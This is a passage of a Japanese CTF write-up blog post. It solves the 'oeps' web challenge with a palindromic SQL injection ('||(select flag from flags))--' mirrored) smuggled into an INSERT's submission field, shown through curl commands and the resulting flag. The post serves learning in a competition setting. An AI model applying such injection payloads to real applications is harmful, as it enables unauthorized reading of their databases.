+Congrats! Here is the flag: hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT}
+</code></pre><h1 id=web-oeps83-solves>[web] oeps(83 solves)</h1><p>回文を投稿するとDBに登録され, 一覧が表示されるサイトが提供されています. 回文の検索も可能ですが, flagを取得するためにはこの機能は用いません.
+<img src=/images/posts/22/oeps.png alt=oeps></p><p>以下の回文を登録するinsert文のsubmissionパラメータを用いてSQLインジェクションを行います.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.py data-lang=.py><span style=display:flex><span>connection<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    insert into pending (user, sentence) values (&#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;, &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span> <span style=color:#f92672>%</span> (
+</span></span><span style=display:flex><span>    token,
+</span></span><span style=display:flex><span>    submission
+</span></span><span style=display:flex><span>))
+</span></span></code></pre></div><p>flagはflagsテーブルに格納されています.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.py data-lang=.py><span style=display:flex><span>connection<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        create table flags (
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            flag text
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        );
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>)
+</span></span></code></pre></div><p>flagをSELECT文で取得し, 文字列に連結してpendingテーブルにinsertします. submissionとして<code>'||(select flag from flags))--</code>を送信します. submissionは回文である必要があるため, <code>--))sgalf morf galf tceles(||'||(select flag from flags))--</code>を送信するとpendingテーブルにsentenseとしてflagを含む文字列が挿入されます.</p><p>まず<code>/</code>を訪問してtokenを発行します.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -I https://oeps.mc.ax
+HTTP/2 200 
+content-type: text/html; charset=utf-8
+date: Sun, 24 Jul 2022 07:38:30 GMT
+server: Python/3.9 aiohttp/3.8.1
+set-cookie: token=3685fb59d7486cdd9a196483743a6fb3
+content-length: 785
+</code></pre><p>次にSQLインジェクションを用いてflagを含む文字列をpendingテーブルに挿入します.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl -X POST -b &#39;token=3685fb59d7486cdd9a196483743a6fb3&#39; --data-urlencode &#34;submission=--))sgalf morf galf tceles(||&#39;||(select flag from flags))--&#34; https://oeps.mc.ax/submit
+302: Found%         
+</code></pre><p>最後にflagを含む文字列を確認します.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>curl -b &#39;token=3685fb59d7486cdd9a196483743a6fb3&#39; https://oeps.mc.ax
+
+        &lt;title&gt;OEPS&lt;/title&gt;
+        &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34; /&gt;
+        &lt;div class=&#34;container&#34;&gt;
+            &lt;h1&gt;The On-Line Encyclopedia of Palidromic Sentences&lt;/h1&gt;
+            Enter a word or phrase:
+            &lt;form action=&#34;/search&#34; method=&#34;GET&#34;&gt;
+                &lt;input type=&#34;text&#34; name=&#34;search&#34; placeholder=&#34;on&#34; /&gt;
+                &lt;input type=&#34;submit&#34; value=&#34;Search&#34; /&gt;
+            &lt;/form&gt;
+            &lt;h2&gt;Submit Sentence:&lt;/h2&gt;
+            New palindrome:
+            &lt;form action=&#34;/submit&#34; method=&#34;POST&#34;&gt;
+                &lt;input type=&#34;text&#34; name=&#34;submission&#34; /&gt;
+                &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
+            &lt;/form&gt;
+            &lt;div style=&#34;color: red&#34;&gt;&lt;/div&gt;
+            &lt;h2&gt;Pending submissions:&lt;/h2&gt;
+            &lt;ul&gt;&lt;li&gt;--))sgalf morf galf tceles(||hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc}&lt;/li&gt;&lt;/ul&gt;
+        &lt;/div&gt;
+    %                    
+</code></pre><h1 id=感想>感想</h1><p>webのoepsで「insert文中でselectのクエリ結果を文字列連結する」というアイデアがなかなか出てこず, 手こずっていました. そのため, そのアイデアを試し, 実際にflagが取れた時はとても嬉しかったです. このように, 悪用の可能性とそれを実現するアイデアを自分で考え, 実行する経験を大事にしていきたいところです.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
